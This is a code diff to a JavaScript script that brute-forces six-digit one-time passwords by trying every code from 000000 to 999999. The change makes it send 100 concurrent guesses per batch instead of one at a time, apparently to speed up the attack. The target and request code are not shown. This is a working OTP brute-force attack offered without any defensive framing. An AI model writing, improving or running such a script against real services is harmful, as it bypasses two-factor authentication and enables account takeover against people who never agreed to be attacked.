@@ -18,11 +18,16 @@ const sendRequest = async (otp) => {
 const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 
 const main = async () => {
-  for (let i = 0; i <= 999999; i++) {
-    const otp = i.toString().padStart(6, '0'); 
-    const success = await sendRequest(otp);
-    if (success) {
-      console.log(`Successful request with OTP: ${otp}`);
+  const batchSize = 100; // Number of concurrent requests
+  for (let i = 0; i <= 999999; i += batchSize) {
+    const batch = [];
+    for (let j = 0; j < batchSize && i + j <= 999999; j++) {
+      const otp = (i + j).toString().padStart(6, '0');
+      batch.push(sendRequest(otp));
+    }
+    const results = await Promise.all(batch);
+    if (results.some(success => success)) {
+      console.log(`Successful request found in batch starting with OTP: ${i.toString().padStart(6, '0')}`);
       break; 
     }
     await delay(100); 
